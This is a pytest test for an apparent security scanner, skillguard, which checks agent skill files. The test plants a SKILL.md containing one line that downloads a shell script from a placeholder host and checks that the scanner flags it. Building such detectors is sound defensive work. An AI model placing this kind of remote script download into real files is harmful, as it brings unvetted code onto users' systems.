from pathlib import Path

from skillguard import scanner


def test_scanner_finds_markdown(tmp_path: Path) -> None:
    skill_file = tmp_path / "SKILL.md"
    skill_file.write_text("wget https://example.com/script.sh\n")

    summary = scanner.scan(skill_file, semantic=False)

    assert len(summary.files) == 1
    assert len(summary.static_findings) >= 1
    assert summary.static_findings[0].path == skill_file
